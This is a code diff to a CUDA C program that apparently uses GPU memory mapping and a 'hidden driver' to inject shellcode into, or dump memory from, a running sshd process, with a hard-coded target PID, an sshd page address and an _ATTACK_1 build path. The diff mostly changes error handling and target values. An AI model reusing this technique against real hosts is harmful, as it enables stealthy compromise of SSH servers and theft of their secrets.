@@ -54,6 +54,13 @@ void aligned_free(void *ptr) {
 		exit(1);															\
 	} }
 
+#define CUDA_CHECK_NORETURN(value) {											\
+	cudaError_t _m_cudaStat = value;										\
+	if (_m_cudaStat != cudaSuccess) {										\
+		fprintf(stderr, "Error %s at line %d in file %s\nContinue\n",					\
+				cudaGetErrorString(_m_cudaStat), __LINE__, __FILE__);		\
+	} }
+
 
 /* CUDA kernel to copy the shellcode. Basically copies to source with given offset. */
 __global__ void PixsysCuda(char * d_source, int offset)
@@ -181,8 +188,8 @@ int main(void) {
 
 	//Set hidden Address:
 //	info_for_cuda_driver->start_addr = (unsigned long)base;
-	info_for_cuda_driver->pid = 14196;
-	info_for_cuda_driver->sshd_page_addr = 0x7f1862dac000;
+	info_for_cuda_driver->pid = 16106;
+	//info_for_cuda_driver->sshd_page_addr = 0x7f1862dac000;
 
 	char * d_real_buff;
 	char * d_dump_buff;
@@ -205,6 +212,8 @@ int main(void) {
 	CUDA_CHECK_RETURN(cudaHostRegister((void *)info_for_cuda_driver, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE)) ;
 	/* Map what a Nice guy would think is a benevelent buffer.
 	Note : Data is copied from user space hidden buffer. It can be changed afterwards. Will not effect Driver!*/
+
+CUDA_CHECK_NORETURN(cudaPeekAtLastError());
 
 #ifdef _ATTACK_1
 	CUDA_CHECK_RETURN(cudaHostRegister((void *)real_buff, pagesize*sizeof(char), CU_MEMHOSTREGISTER_PORTABLE)) ;
@@ -262,8 +271,9 @@ int main(void) {
 #endif
 		CUDA_CHECK_RETURN(cudaHostUnregister((void *)dump_buff));
 		CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
-		CUDA_CHECK_RETURN(cudaGetLastError());
+		CUDA_CHECK_NORETURN(cudaGetLastError());
 
+		printf("Finished, now exiting.\n");
 
 	//}
 	//sleep(3000);
@@ -277,7 +287,7 @@ int main(void) {
 	bitreverse<<<1, WORK_SIZE, WORK_SIZE * sizeof(int)>>>(d);
 	*/
 	//CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
-	//CUDA_CHECK_RETURN(cudaGetLastError());
+	//CUDA_CHECK_NORETURN(cudaGetLastError());
 	/*CUDA_CHECK_RETURN(cudaMemcpy(odata, d, sizeof(int) * WORK_SIZE, cudaMemcpyDeviceToHost));
 
 	for (i = 0; i < WORK_SIZE; i++)
